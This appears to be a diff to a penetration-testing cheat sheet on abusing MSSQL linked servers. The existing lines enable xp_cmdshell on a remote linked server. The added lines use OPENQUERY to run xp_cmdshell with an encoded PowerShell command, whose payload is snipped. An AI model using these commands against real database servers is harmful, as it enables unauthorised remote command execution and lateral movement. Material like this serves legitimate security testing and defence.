@@ -32,3 +32,7 @@ EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [remote sql]
 EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [remote sql]
 SELECT * FROM OPENQUERY("[remote sql]", 'select * from sys.configurations where name = ''xp_cmdshell''')
 ```
+
+```
+SELECT * FROM OPENQUERY("[remote sql]", 'select @@servername; exec xp_cmdshell ''powershell -enc [...snip...]''')
+```
